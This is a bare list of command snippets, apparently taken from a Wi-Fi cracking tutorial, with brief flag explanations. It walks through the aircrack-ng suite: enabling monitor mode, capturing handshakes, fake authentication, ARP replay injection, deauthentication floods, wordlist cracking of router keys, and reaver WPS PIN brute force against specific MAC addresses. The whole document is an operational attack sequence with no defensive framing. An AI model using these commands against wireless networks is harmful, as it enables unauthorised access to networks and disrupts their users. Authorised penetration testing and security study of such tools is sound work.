["```\naireplay-ng -9 -e ganon -a 00:28:6C:E4:40:80 wlan0\n```", "```\nairodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w output wlan0 \n```", "```\n aireplay-ng -1 0 -e ganon -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0 \n\n-1 means fake authentication \n0 reassociation timing in seconds \n-e ganon is the wireless network name \n-a 00:14:6C:7E:40:80 is the access point MAC address \n-h 00:0F:B5:88:AC:82 is our card MAC address \n```", "```\naireplay-ng -1 6000 -o 1 -q 10 -e ganon -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0 \n\n6000 - Reauthenticate every 6000 seconds. The long period also causes keep alive packets to be sent. \n-o 1 - Send only one set of packets at a time. Default is multiple and this confuses some APs. \n-q 10 - Send keep alive packets every 10 seconds. \n```", "```\n aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0 \n```", "```\n aircrack-ng -b 00:14:6C:7E:40:80 output*.cap \n\n-b 00:14:6C:7E:40:80 selects the one access point we are interested in.  \n\n*.cap selects all files starting with \"output\" and ending in \".cap\". \n```", "```\nairmon-ng start wlan0 \n```", "```\n airodump-ng wlan0 \n```", "```\n airodump-ng -c channel -bssid [bssid of wifi] -w [path to \n    write the data of packets]   wlan0mon[interface]. \n```", "```\n aireplay-ng -deauth 10 -a [router bssid] interface \n```", "```\n aircrack-ng -b [bssid of router] -w [path to word list] \n    [path to capture packets] \n```", "```\nairmon-ng start wlan0 \n```", "```\nwash -i mon0 \n```", "```\nreaver -i mon0 -c 6 -b 00:23:69:48:33:95 -vv \n```"]